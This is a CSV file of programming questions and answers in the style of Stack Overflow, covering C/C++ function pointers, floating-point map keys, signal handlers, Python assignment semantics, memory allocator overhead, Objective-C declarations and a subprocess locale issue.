QUESTION,USERID,USERNAME,ANSWER
"<p>One of my teachers use this type declaration:</p>

<pre><code>typedef void (*SortFunction)(int a[], int n);
</code></pre>

<p>to create a type that can hold a pointer to a function
and that can be used to call that function later on in a program.</p>

<p>I also know that to pass a function as a parameter you have to 
wrap the function name in parenthesis and wrap the function's
parameters in parenthesis after the function name as well like so</p>

<pre><code>function someFunction( (anotherfunction)(type arg1, type arg2,...)){
  ...
} 
</code></pre>

<p>What I want to know is why must you wrap a function in parenthesis like this? is this a built in function of most c++ compilers or is it simply a trick that we programmers use
in order to enable functions as arguments within our code? also, why does ""SortFunction""
in the typedef statement need to be referenced, why can't the variable you use to utilize SortFunction just hold the function instead of pointing to it?</p>
","9530","","<p>There's nothing special about function arguments.  Whenever you declare a function pointer (as a local variable, global variable, class member variable, function parameter, typedef, etc.), it's always declared like so:</p>

<pre><code>return_type (*var_name)(T1 param1, T2 param2, /* etc. */ );
//           ^
//           |
// This * is very important!
</code></pre>

<p>Where <code>var_name</code> is the name of the function pointer variable.  The reason the parentheses are needed around <code>*var_name</code> is due to operator precedence: without the parentheses, the <code>*</code> (indicating that something's a pointer) would match with the function's return type, and instead you'd get something like a return type of <code>int*</code> (pointer to <code>int</code>) instead of plain <code>int</code>.</p>

<p>You can't pass a function as an argument because functions are not first-class objects in C and C++.  The only way to pass a function is my passing a pointer to the function.</p>
"
"<p>I am trying get a handle on C and Cyclone as I work my way thru Jim Trevor's ""<a href=""http://www.cs.umd.edu/projects/cyclone/papers/cyclone-safety.pdf"" rel=""nofollow"">Cyclone: A safe dialect of C</a>"" for a PL class. Trevor gives this example of an unsafe go-to statement: </p>

<pre><code>int z;
{ int x = 0xBAD; goto L; }
{ int *y = &amp;z;
L: *y = 3; // Possible segfault
}
</code></pre>

<p>Trevor explains the safety issue in the above code as follows: </p>

<p>Many compilers stack allocate
the local variables of a block when it is entered, and
deallocate (pop) the storage when the block exits
(though this is not mandated by the C standard).
If the example is compiled in this way, then when
the program enters the ﬁrst block, space for x is allocated on the stack, and is initialized with the value
0xBAD. The goto jumps into the middle of the second block, directly to the assignment to the contents
of the pointer y. Since y is the ﬁrst (only) variable
declared in the second block, the assignment expects
y to be at the top of the stack. Unfortunately, that’s
exactly where x was allocated, so the program tries
to write to location 0xBAD, probably triggering a
segmentation fault.</p>

<p>I don't understand why the <code>go to</code> statement is an issue here. It seems like the issue is unpredictable behavior from the un-initialized pointer Z. At the start of the second block, <code>int * y</code> be filled with the address of Z. Z is uninitialized so it would fill <code>int* y</code> with the bit pattern on the stack in the area of memory referenced by Z. I don't understand why Trevor's paper implies that Z and X somehow both reference 0xBAD. Wouldn't C create a new stack frame for the first block (as Trevor describes): thus writing 0xBAD to a new frame in memory (and not the location in memory referenced by Z)?</p>
","9530","","<p>As you said, the problem is that the variable <code>y</code> might be accessed before it's initialized.  The code snippet you gave is just one way that's likely to demonstrate the problem.</p>

<p>When I compile this with GCC with the <code>-Wall</code> option, it warns that <code>warning 'y' is used uninitialized in this function</code>.  If I compiled it as C++ code with g++, it's actually an error:</p>

<pre><code>test.cc:8:3: error: jump to label ‘L’
test.cc:6:25: error:   from here
test.cc:7:10: error:   crosses initialization of ‘int* y’
</code></pre>

<p>Although in this case <code>y</code> is a POD type, if it were instead a class that had a constructor, the <code>goto</code> would skip the constructor.  The C++ language specification says this is illegal in all cases.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/6684573/floating-point-keys-in-stdmap"">Floating point keys in std:map</a>  </p>
</blockquote>



<p>Well I know there are cases where you want to provide a special function for doing doubles comparison. Such cases could include times when you do arithmetic operations because you get rounding in the floating point arithmetic. </p>

<p>However are there times when it is safe to use &lt; or > to compare doubles?</p>

<p>Let's say I have list of doubles that are calculated once that I need to sort or use as a key in a map (ie. std::map) and I guarantee that there aren't any additional arithmetic operations afterwards. </p>

<p>Can I guarantee that my sort order will be correct if I traverse the collection using iterators?</p>

<p>I'm thinking I can get more performance this way.</p>
","9530","","<p>It's always safe to use <code>&lt;</code> to compare <code>double</code> values in a <code>std::map</code>, as long as you never add any NaN values.  The comparison used for the map must be a <em>strict weak ordering</em>, which has these requirements (C++03 §23.1.2/2 and §25.3/3-4):</p>

<ul>
<li>Define <code>equiv(a, b)</code> as <code>!(a &lt; b) &amp;&amp; !(b &lt; a)</code>.  Then, both <code>&lt;</code> and <code>equiv</code> must be transitive relations:
<ol>
<li>If <code>a &lt; b</code> and <code>b &lt; c</code>, then <code>a &lt; c</code> must be true</li>
<li>If <code>equiv(a, b)</code> and <code>equiv(b, c)</code>, then <code>equiv(a, c)</code> must be true</li>
</ol></li>
</ul>

<p><code>double</code> value comparisons certainly satisfy these axioms, <em>except</em> when NaN values are thrown into the mix.  NaNs have the strange property that they are unequal to all values (including themselves!) but not less than or greater than anything:</p>

<pre><code>NaN &lt; 0    // false
NaN &lt;= 0   // false
NaN == 0   // false
NaN &gt; 0    // false
NaN &gt;= 0   // false
NaN != 0   // true
NaN &lt; NaN  // false
NaN &lt;= NaN // false
NaN == NaN // false (!!!)
NaN &gt; NaN  // false
NaN &gt;= NaN // false
NaN != NaN // true (!!!)
</code></pre>

<p>This causes problems, because under the rules above, <code>NaN</code> has the property that <code>equiv(x, NaN)</code> is true for all <code>x</code>, which by transitivity implies that all values are equivalent, except non-NaN values are clearly not equivalent.</p>
"
"<p>I'm writing a simple shell, and I have to fork a child process an external program using execv. I have to send the signal TSTP(Cntl+Z) to the signal handler, and then kill the currently running child process. My problem is I can't find a way to pass the Child pid into the signal handler. If i do a getpid() in the handler, it just returns the parent pid. I also tried setting the child pid as getpid() inside the child process, and having that variable as a global variable, but that also didn't work. Here is some of the code I have so far.</p>

<pre><code>void handler(int);
//in main
if (!built_in_cmd(myArgc,myArgs)) {
    pid_t pid;
    char *x = myArgs[0];
    if((pid=fork())&lt;0)
        printf(""Parent: fork() process failed"");
    else {
        if (pid == 0) {
            y=getpid();
            printf(""Parent: My child has been spawned. %d %d\n"",y,getppid());
            execv(x, myArgs);
            exit(0);
        }
        else {
            signal(SIGTSTP,handler);
            wait(0);
            printf(""Parent: My child has terminated.\n"");
        }
    }
}
return;

//outside main
void handler(int signo){
    kill(idk,SIGKILL);
} 
</code></pre>
","9530","","<p>Signals are asynchronous in nature, there's no way to pass any extra state to them except through global variables.  Assuming that you only ever have one thread waiting for a child, it's safe to use a global, but otherwise there's no multithread-safe way of doing so:</p>

<pre><code>// At global scope
pid_t child_pid = (pid_t)-1;
...
void myfunc()
{
    pid_t pid;
    if((pid = fork()) &lt; 0)
        ...
    else if(pid == 0)
        ...
    else
    {
        child_pid = pid;
        ...
    }
}
</code></pre>
"
"<p>I'm kind of beginner in python. I was looking at one the types to make a fibonacci function,</p>

<pre><code>def fib(n):
a=0
b=1
while a&lt;n:
    print a
    a,b=b,a+b
</code></pre>

<p>and I saw the a,b=b,a+b declaration. So, I thought a=b and b=a+b were the same to a,b=a,b+a, so I changed the function for it to be like this:</p>

<pre><code>def fib(n):
a=0
b=1
while a&lt;n:
    print a
    a=b
    b=a+b
</code></pre>

<p>and I thought it would be right, but when I executed the program, I got a different output. Can someone explain to me the difference between those two types of declaration?</p>

<p>Thanks, anyway.</p>
","9530","","<p>That syntax simultaneously assigns new values to <code>a</code> and <code>b</code> based on the current values.  The reason it's not equivalent is that when you write the two separate statements, the second assignment uses the <em>new</em> value of <code>a</code> instead of the <em>old</em> value of <code>a</code>.</p>
"
"<p>Is there a generic suppress warning that i can use? </p>

<p>The problem is that there are times i may build using one compiler version (gcc) and then i have a partner that uses some of the common things but uses a different compiler. So the warning # are different.</p>

<p>The only way i could think of doing was making a macro that was defined in a file that i would pass in some generic value:</p>

<pre><code>SUPPRESS_WARNING_BEGIN(NEVER_USED)
//code
SUPPRESS_WARNING_END
</code></pre>

<p>then the file would have something like:</p>

<pre><code>#if COMPILER_A
    NEVER_USED = 245
#endif

#if COMPILER_B
    NEVER_USED = 332
#endif


#define SUPPRESS_WARNING_BEGIN(x) /
     #if COMPILER_A
        //Compiler A suppress warning x
     #endif

     #if COMPILER_B
        //Compiler B suppress warning x
     #endif

#define SUPPRESS_WARNING_END /
     #if COMPILER_A
        // END Compiler A suppress warning
     #endif

     #if COMPILER_B
        // END Compiler A suppress warning
     #endif
</code></pre>

<p>Don't know if there is an easier way? Also i know ideally we all would just use the same compiler but that is unfortunately not an option. Just trying to find the least complicated way to support something like this and am hoping there is a simpler way then mentioned above.</p>

<p>thanks</p>
","9530","","<p>There's no portable way to do that.  Different compilers do it in different ways (e.g. <a href=""http://msdn.microsoft.com/en-us/library/2c8f766e%28v=vs.80%29.aspx"" rel=""nofollow""><code>#pragma warning</code></a>, <a href=""http://gcc.gnu.org/onlinedocs/gcc/Diagnostic-Pragmas.html"" rel=""nofollow""><code>#pragma GCC diagnostic</code></a>, etc.).</p>

<p>The easiest and best thing to do is to write code that does not generate any warnings with at compiler at any warning level.</p>

<p>If your goal is to suppress warnings about unused variables, I recommend using a macro:</p>

<pre><code>#define UNUSED(x) ((void)sizeof(x))
...
void some_function(int x, int y)
{
    // No warnings will be generated if x is otherwise unused
    UNUSED(x);
    ....
}
</code></pre>

<p>The <code>sizeof</code> operator is evaluated at compile-time, and the cast to <code>void</code> produces no result, so any compiler will optimize the <code>UNUSED</code> statement away into nothing but consider the operand to be used.</p>

<p>GCC also has the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html"" rel=""nofollow""><code>unused</code> attribute`</a>:</p>

<pre><code>// No warnings will be generated if x is otherwise unused
int x __attribute__((unused));
</code></pre>
"
"<p>I searched everywhere and even though there were a couple of questions and answers regarding this error I couldn't find a solution to fix my problem</p>

<p>I'm reading in from a file that contains letters and numbers and I'm populating my matrix depending on the values in that file.
ex: file
description of letters and numbers ... 
table:</p>

<pre><code>  a b c d 
a 1 2 5 6
b 5 6 3 4 
c 3 2 1 4 
d 2 4 6 8 
</code></pre>

<p>Here's the code</p>

<pre><code>matrix = [[0 for j in range(4)] for i in range(4)]
i = 0
j = 0

for line in file:
   for a in line:
      if is_number(a):
         matrix[i][j] = int(a)
         j+= 1
      if matrix.count(0) &lt; 2: #since matrix already populated with zeroes. it shouldn't have 
                               #many per program specifications, that's why I use this 
                               #conditional to increment i and reset j back to 0
         i += 1
         j = 0

file.close()
</code></pre>

<p>I don't understand why I keep getting that error. </p>
","9530","","<p>You're constructing a 4x4 matrix in the first line of code, but your data is a 6x6 matrix.  When you try to store an element at index 4 in row 0, you get an <code>IndexError</code>.</p>
"
"<p>I am quite new to python...</p>

<pre><code> import sys, os, time, py4chan, urllib from urllib2 import urlopen, URLError, HTTPError

 def refreshthread(boardin,no):
     global thread
     global topic
     board = py4chan.Board(boardin)
     thread = board.getThread(int(no))
     topic = thread.topic
     time.sleep(2.5)

 def dlfile(url, folder):

     try:
         f = urlopen(url)

         with open(folder + ""/"" + os.path.basename(url), ""wb"") as local_file:
             local_file.write(f.read())
             print ""Downloaded to "" + str(folder + ""/"" + os.path.basename(url)) 

     except HTTPError, e:
         print ""HTTP Error:"", e.code, url
     except URLError, e:
         print ""URL Error:"", e.reason, url

 def getsize(uri):
     file = urllib.urlopen(uri)
     size = file.headers.get(""content-length"")
     file.close()
     return str(int(size) / 1024)

 def main():
     boardtag = str(raw_input(""Board: ""))
     threadno = int(raw_input(""Thread id: ""))
     folder = str(raw_input(""Save to folder: ""))
     print ""Getting thread information...""
     refreshthread(boardtag,threadno)
     print ""Subject: "" + topic.Subject
     while(True):
         if not os.path.exists(folder): os.makedirs(folder)
         refreshthread(boardtag,threadno)
         for imgurl in thread.Files():
             if imgurl is not None and not os.path.exists(folder + ""/"" + os.path.basename(imgurl)):
                 print ""A wild image appears! "" + ""("" + getsize(imgurl) + ""kb)"" 
                 dlfile(imgurl,folder)
             else:
                 pass

 if __name__ == '__main__':
     main()
</code></pre>

<p>I coded this on linux and it runs perfectly, but if I run this on windows, I get this error:</p>

<pre><code>TypeError: __init__() takes exactly 4 arguments (2 given)
</code></pre>

<p>Which is quite strange as I haven't defined <strong>init</strong>.
Could this be an <strong>init</strong> from another module?</p>

<p>The py4chan module seems to work fine if i code other scripts.
Both machines have same python version too.</p>

<p><strong>EDIT</strong>(Full error):</p>

<pre><code>Getting thread information...
Traceback (most recent call last):
  File ""4chan.py"", line 59, in &lt;module&gt;
    main()
  File ""4chan.py"", line 46, in main
    refreshthread(boardtag,threadno)
  File ""4chan.py"", line 15, in refreshthread
    board = py4chan.Board(boardin)
TypeError: __init__() takes exactly 4 arguments (2 given)
</code></pre>

<p>*<em>Edit:</em>*Okay, i had two different modules of the same name. All working now.
I shouldn't be allowed on this website.</p>
","9530","","<p>The <code>py4chan.Board</code> class needs to be constructed with 3 arguments, not 1.  This line in the <code>refreshthread</code> function:</p>

<pre><code>board = py4chan.Board(boardin)
</code></pre>

<p>Should look something this:</p>

<pre><code>board = py4chan.Board(base_url, post_url, filesize)
</code></pre>
"
"<p>I tested this code just trying to find out how much memory c++ actually reserved for the new operator. </p>

<pre><code>#include&lt;iostream&gt;
using namespace std;
int main() {

  cout &lt;&lt; ""alignment of "" &lt;&lt; alignof(int) &lt;&lt; endl;
  int *intP1 = new int;
  *intP1 = 100;
  cout &lt;&lt; ""address of intP1 "" &lt;&lt; intP1 &lt;&lt; endl;
  int *intP2 = new int;
  *intP2 = 999;
  cout &lt;&lt; ""address of intP2 "" &lt;&lt; intP2 &lt;&lt; endl;
  int *intP3 = new int;
  cout &lt;&lt; ""address of intP3 "" &lt;&lt; intP3 &lt;&lt; endl;
  *intP3 = 333;

  cout &lt;&lt; endl;
  cout &lt;&lt; (reinterpret_cast&lt;char *&gt;(intP3)-reinterpret_cast&lt;char *&gt;(intP2)) &lt;&lt; endl;
  cout &lt;&lt; intP3-intP2 &lt;&lt; endl;
  cout &lt;&lt; endl;

  cout &lt;&lt; *(intP1) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+4) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+8) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+16) &lt;&lt; endl;
  delete intP1;
  delete intP2;
  delete intP3;
  return 0;
}
</code></pre>

<p>After compiled the code with -std=c++11 flag and ran it, here is what I got from a x86_64 machine. </p>

<pre><code>    alignment of int4
    address of intP1 = 0xa59010
    address of intP2 = 0xa59030
    address of intP3 = 0xa59050

    the distance of intP3 and intP2 = 32

    intP1 value = 100
    is this a padding value = 0
    intP2 value = 999
    intP3 value = 333
</code></pre>

<p>It seems that when using new to allocate a 4 bytes memory for an integer, it actually reserved 32 bytes block which is the total space for 8 integers. According to the explanation of the c++ alignment, for 64 bit machine, memory is aligned on 16 bytes, why the distance here is 32 bytes?</p>

<p>Could some one help me to sort this out? Thanks in advance. </p>
","9530","","<p>It has nothing to do with alignment -- it's extra overhead of how the internal memory allocator works.  Typically, each memory block has extra hidden information in it at the front and/or back used for maintaining the heap's structure.  Exactly how much overhead there is is will vary from platform to platform and from implementation to implementation.</p>

<p>For example, <a href=""http://g.oswego.edu/dl/html/malloc.html"">Doug Lea's <code>malloc</code></a> has an extra overhead of 4-8 bytes per allocation (32-bit pointers) or 8-16 bytes (64-bit pointers) and a minimum allocation size of 16 bytes (32-bit) or 32 bytes (64-bit).  That means for even 1-byte allocations, the memory allocator requires a total of 16 bytes of tracking overhead.</p>
"
"<p>Given the following</p>

<ul>
<li>Bitmap raw image data in char array</li>
<li>Image width and height</li>
<li>Path <code>wzAppDataDirectory</code> in std::wstring generated using the following code</li>
</ul>

<hr>

<pre><code>// Get a good path.
wchar_t wzAppDataDirectory[MAX_PATH];
wcscpy_s( wzAppDataDirectory, MAX_PATH, Windows::Storage::ApplicationData::Current-&gt;LocalFolder-&gt;Path-&gt;Data() );
wcscat_s( wzAppDataDirectory, MAX_PATH, (std::wstring(L""\\"") + fileName).c_str() );
</code></pre>

<hr>

<p>How can we save the image as JPG? (Include encoding as well as the char array is raw bitmap form)</p>

<p>Code example is very much appreciated.</p>
","9530","","<p>You'll need to use a library to encode the JPEG.  Some possibilities are the <a href=""http://www.ijg.org/"" rel=""nofollow"">Independent JPEG Group's jpeglib</a>, <a href=""http://nothings.org/stb_image.c"" rel=""nofollow""><code>stb_image</code></a>, or <a href=""http://openil.sourceforge.net/"" rel=""nofollow"">DevIL</a>.</p>
"
"<p>Just learning Objective-C coming from a Java background. I am trying to write a program that has no purpose other then to teach me how to write functions in this language and I am getting errors everywhere. The problem is since I just started with this language yesterday the errors make no sense to me. Here is what I have so far.</p>

<p><strong>Main Method:</strong> </p>

<pre><code>int main (int argc, const char * argv[])
{
    @autoreleasepool
    {
        NSString * prompt = @""Hello World"";

        prompt = writePromptMessage(prompt);

        NSLog(@""%@"", prompt);
    }

    return 0;
}
</code></pre>

<p><strong>Special Method:</strong></p>

<pre><code>NSString *writePromptMessage(NSString * prompt)
{
    return prompt;
}
</code></pre>

<p><strong>My Errors:</strong></p>

<ul>
<li>Implicit declaration of function writePromptMessage is invalid in C99 </li>
<li>Implicit conversion of 'int' to 'NSString *' is disallowed with ARC </li>
<li>Incomplete integer to pointer conversion assigning NSString strong from int </li>
<li>Conflicting Types for writePromptMessage</li>
</ul>
","9530","","<p>Unlike Java, you need to add a <em>function declaration</em> (aka a <em>function prototype</em>) before the point where it's used.  A function declaration is just like the function definition, but without the body (i.e. the code) of the function, and ending with a semicolon:</p>

<pre><code>// This is a function declaration:
NSString *writePromptMessage(NSString * prompt);

// This is a function definition:
NSString *writePromptMessage(NSString * prompt)
{
    // Function body goes here
}
</code></pre>

<p>In order to be able to call a function, you need to have written a declaration <em>before</em> the usage site:</p>

<pre><code>NSString *writePromptMessage(NSString * prompt);  // declaration

int main (int argc, const char * argv[])
{
    ...
    writePromptMessage(...);  // usage
}

// definition follows
</code></pre>

<p>Alternatively, you can place the whole definition before the usage site, but this won't always be possible (e.g. if you have two functions which can call each other).</p>

<p>C and Objective-C do actually allow you to call functions that don't have visible declarations, but this is considered a deprecated feature because it's easy to misuse and cause subtle errors:</p>

<p>If a function is called without a visible declaration, the compiler creates an <em>implicit 
declaration</em>:</p>

<ul>
<li>The implicit declaration takes an arbitrary number and types of parameters </li>
<li>The implicit declaration returns <code>int</code></li>
</ul>

<p>So, what happened is that the compiler is assuming that <code>writePromptMessage</code> returns <code>int</code> when it first sees it, which is wrong, and that causes a cascade of other errors.  For functions which don't return <code>int</code>, you <strong>must</strong> never use implicit function declarations, and for functions which do return <code>int</code>, you <strong>should</strong> never use implicit function declarations.</p>
"
"<p>I met a very weird behavior on a private variable in class.</p>

<p>Problem Description: The value of a private member ""current"" in class lapi_xmeef_table is changed abnormally in the end of a member function.</p>

<p>class 1: lapi_xmeef
class 2: lapi_xmeef_table (is friend of lapi_xmeef, so can access private variables in lapi_xmeef directly or via public interfaces)</p>

<pre><code>class lapi_xmeef {
  friend class lapi_xmeef_table;
  ...
  short bias_frag_layer;
  int bias_frag_index;
  ...
  public:
    // Add constructor
    lapi_xmeef();
    // Add public interface
    ...
    void bias_frag(int *li, int *fi);

};

class lapi_xmeef_table {
  private:
    lapi_xmeef *current;
    ...
  public:
    lapi_xmeef_table(Lapi_ctl *ctl, int num_layer);
    ...
    void get_bias(int *li, int *fi);
    ...
}; 
</code></pre>

<p>A private variable in lapi_xmeef_table called ""current"" is a current iterator (a class lapi_xmeef).</p>

<p>The member function does nothing but read only, it copies two values from its private members. Show as below</p>

<pre><code>void lapi_xmeef::bias_frag(int *li, int *fi)
{
   *li = (short)bias_frag_layer;
   *fi = bias_frag_index;
}
</code></pre>

<p>Problem function and variable:</p>

<pre><code>void lapi_xmeef_table::get_bias(int *li, int *fi)
{
// current is (lapi_xmeef *) 0x2a9a93c7f0 (a valid address)
  current-&gt;bias_frag(li, fi);
// current is (lapi_xmeef *) 0x2a000000df (a invalid address)
}
</code></pre>

<p>Before calling the function current is (lapi_xmeef *) 0x2a9a93c7f0 (a valid address)
After, current is (lapi_xmeef *) 0x2a000000df (a invalid address)</p>

<p>This doesn't happen every time when the member function is called, before this weird behavior, it's called many time without problem.</p>

<p>When next time, a member in current is being accessed, a seg fault occurs because a invalid address is dereferenced.</p>

<p>Now my solution is have a temp pointer to save the value of current before calling its member function, then restore it after calling. It works.</p>

<pre><code>void lapi_xmeef_table::get_bias(int *li, int *fi)
{
  lapi_xmeef *temp = current;
  current-&gt;bias_frag(li, fi);
  current = temp;
}
</code></pre>

<p>But I really want to know why and how to fix it instead of this tricky way.</p>

<p>Why the value of private variable is changed which is expected to be the same?</p>

<p>Any problem in the way accessing a private varibale? Is prefix needed or the point ""this"" needed? I tried this->current->bias_frag(li, fi); which doesn't help.</p>

<p>Thank you in advance.</p>
","9530","","<p>What's likely happening is that you have unintended <em>pointer aliasing</em> going on.  One of the <code>li</code> or <code>fi</code> pointers is pointing to the same location as <code>&amp;current</code>, so when you dereference and assign to them inside <code>bias_frag</code>, you're accidentally overwriting <code>current</code> or part of it.</p>

<p>To fix it, you need to figure out why you're getting aliased pointers by tracing the data flow backwards.  For starters, crank up your compiler's warning level and fix all warnings.</p>

<p>Do not try to work around it by saving the value of <code>current</code> and restoring it -- that's just a bandage over a much bigger problem and is not a long-term solution.  You've already entered the land of undefined behavior, and trying to dig yourself out is not going to work.</p>
"
"<p>I have Django running on a standard WSGI/Apache httpd combo.</p>

<p>I noticed that file output was different when I ran code in the shell vs. from the browser. I've isolated out everything else and am still getting the same problem.</p>

<p>Here's the code:</p>

<pre><code>def test_antiword(filename):
    import subprocess
    with open(filename, 'w') as writefile:
        subprocess.Popen([""antiword"", '/tmp/test.doc'], stdout=writefile)
    p = subprocess.Popen([""antiword"", '/tmp/test.doc'], stdout=subprocess.PIPE)
    out, _ = p.communicate()
    ords = []
    for kk in out:
        ords.append(ord(kk))
    return out, ords

def test_antiword_view(request):
    import HttpResponse
    return HttpResponse(repr(test_antiword('/tmp/web.txt')))
</code></pre>

<p>When open the url in the browser, this is the output:</p>

<blockquote>
  <p>('\n""I said good day sir. Good day!"" shouted Sh\xe9rlo\xe7k H\xf8lme\xa3.\n\n ""Why not Zoidberg?"" queried Zoidberg.\n', [10, 34, 73, 32, 115, 97, 105, 100, 32, 103, 111, 111, 100, 32, 100, 97, 121, 32, 115, 105, 114, 46, 32, 71, 111, 111, 100, 32, 100, 97, 121, 33, 34, 32, 115, 104, 111, 117, 116, 101, 100, 32, 83, 104, 233, 114, 108, 111, 231, 107, 32, 72, 248, 108, 109, 101, 163, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 34, 87, 104, 121, 32, 110, 111, 116, 32, 90, 111, 105, 100, 98, 101, 114, 103, 63, 34, 32, 113, 117, 101, 114, 105, 101, 100, 32, 90, 111, 105, 100, 98, 101, 114, 103, 46, 10])</p>
</blockquote>

<p>This is the corresponding output when I call <code>test_antiword('/tmp/shell.txt')</code> ine hte shell:</p>

<blockquote>
  <p>('\n\xe2\x80\x9cI said good day sir. Good day!\xe2\x80\x9d shouted Sh\xc3\xa9rlo\xc3\xa7k H\xc3\xb8lme\xc2\xa3.\n\n             \xe2\x80\x9cWhy not Zoidberg?\xe2\x80\x9d queried Zoidberg.\n', [10, 226, 128, 156, 73, 32, 115, 97, 105, 100, 32, 103, 111, 111, 100, 32, 100, 97, 121, 32, 115, 105, 114, 46, 32, 71, 111, 111, 100, 32, 100, 97, 121, 33, 226, 128, 157, 32, 115, 104, 111, 117, 116, 101, 100, 32, 83, 104, 195, 169, 114, 108, 111, 195, 167, 107, 32, 72, 195, 184, 108, 109, 101, 194, 163, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 226, 128, 156, 87, 104, 121, 32, 110, 111, 116, 32, 90, 111, 105, 100, 98, 101, 114, 103, 63, 226, 128, 157, 32, 113, 117, 101, 114, 105, 101, 100, 32, 90, 111, 105, 100, 98, 101, 114, 103, 46, 10])</p>
</blockquote>

<p>As you can see, the output is very different. For one thing, the shell output maintains the whitespace that was in the original file; it's lost in the web version.</p>

<p>As you can see in the code, I also output the documents to files. The generated output is below:</p>

<p><strong>web.txt</strong></p>

<pre><code>""I said good day sir. Good day!"" shouted Sh?rlo?k H?lme?.

             ""Why not Zoidberg?"" queried Zoidberg.
</code></pre>

<p><strong>shell.txt</strong></p>

<pre><code>“I said good day sir. Good day!” shouted Shérloçk Hølme£.

             “Why not Zoidberg?” queried Zoidberg.
</code></pre>

<p>In the web version, the characters are unrecognized and the encoding is identified by <code>file</code> as ISO-8859. In the shell version, the characters display correctly and the encoding is identified by <code>file</code> as UTF-8.</p>

<p>I am at a loss to why this could be happening. I've checked and both processes are using the same version of antiword. In addition, I've verified that they are both using the same python module file for <code>subprocess</code>. The version of Python being used in both cases matches exactly also.</p>

<p>Can anyone explain what might be going on?</p>
","9530","","<p>The difference is likely due to an environment variable.  According to the <a href=""http://linux.die.net/man/1/antiword"" rel=""nofollow"">man page</a>:</p>

<blockquote>
  <p>Antiword uses the environment variables <code>LC_ALL</code>, <code>LC_CTYPE</code> and <code>LANG</code> (in that order) to get the current locale and uses this information to select the default mapping file. </p>
</blockquote>

<p>I suspect that what's happening is that when you run it from your shell, your shell is in a UTF-8 locale, but when you run it from Django, it's in a different locale, and it can't properly convert the Unicode characters.  Try switching into a UTF-8 locale when running the subprocess like this:</p>

<pre><code>new_env = dict(os.environ)  # Copy current environment
new_env['LANG'] = 'en_US.UTF-8'
p = subprocess.Popen(..., env=new_env)
</code></pre>
"
"<p>Is it acceptable/safe in Objective-C/Cocoa to wrapping the <code>init</code> method as follows:</p>

<pre><code>-(id)init {
    if ((self=[super init])) {
         self.bar = [[Bar alloc] init];
    }
    return self;
}

-(id)initWithFoo:(Foo *)f {
    if ((self=[self init])) {
         self.foo = f;
    }
    return self;
}
</code></pre>

<p><strong>Note the <code>[self init]</code> in <code>initWithFoo</code>.</strong></p>

<p><em>perhaps this is a simple yes answer... seem obvious, but not standard?</em></p>
","9530","","<p>It's certainly acceptable and safe.  I'm not certain if it's standard practice, but I don't think it's bad practice.</p>

<p><strong>Note:</strong> This is not <em>overloading</em>.  Overloading refers to a very specific thing in C-like languages (particularly C++) where you have multiple functions with the same name, distinguished only by their numbers and/or types of parameters.  A better term for this would probably be something like <em>forwarding</em> or <em>wrapping</em>.</p>
"
